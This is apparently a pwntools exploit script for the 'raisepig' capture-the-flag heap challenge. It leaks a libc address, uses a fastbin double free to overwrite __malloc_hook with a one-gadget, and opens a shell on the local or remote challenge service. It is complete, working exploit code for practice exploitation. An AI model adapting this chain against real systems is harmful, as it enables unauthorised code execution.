## file: exp for raise pig 
## date: 2018-04-26
## author: raycp

from pwn import *
from ctypes import *

DEBUG = 1
if DEBUG:
     p = process('./raisepig')
     #scontext.log_level = 'debug'
     #libc = ELF('/lib32/libc-2.24.so')
     #p = process(['./babystack.dms'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc_64.so.6')})
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     
else:
     p = remote('39.107.33.43', 13570)
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #libc = ELF('libc_64.so.6')


wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))  


#context.log_level = 'debug'

def raise_pig(size,name,typ):
    p.recvuntil('choice : ')
    p.sendline('1')
    p.recvuntil('name :')
    p.sendline(str(size))
    p.recvuntil('pig :')
    p.send(name)
    p.recvuntil('pig :')
    p.send(typ)

def visit():
    p.recvuntil('choice : ')
    p.sendline('2')
    

def eat_pig(idx):
    p.recvuntil('choice : ')
    p.sendline('3')
    p.recvuntil('to eat:')
    p.sendline(str(idx))

def eat_farm():
    p.recvuntil('choice : ')
    p.sendline('4')

def pwn():
    
    raise_pig(0x90,'0','0\n')
    raise_pig(0x60,'1','1\n')
    raise_pig(0x60,'2','1\n')
    eat_pig(0x0)
    #d
    raise_pig(0x60,'a'*8,'3\n')
    visit()
    
    p.recvuntil('aaaaaaaa')
    
    libc_base=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-0x3c4b78
    malloc_hook_chunk=libc_base+libc.symbols['__malloc_hook']-0x1b-8
    rce=libc_base+0xf02a4
    print hex(rce)
    print "libc base",hex(libc_base)
    eat_pig(0x3)
    eat_pig(0x1)
    eat_pig(0x3)
    
    raise_pig(0x60,p64(malloc_hook_chunk),'4\n')
    raise_pig(0x60,p64(malloc_hook_chunk),'5\n')
    raise_pig(0x60,p64(malloc_hook_chunk),'6\n')
    debug(0xd3a)
    raise_pig(0x60,'\x00'*(0xb+0x8)+p64(rce),'7\n')

    eat_pig(0x2)
    eat_pig(0x2)
    p.interactive()

if __name__ == '__main__':
   pwn()



 

    
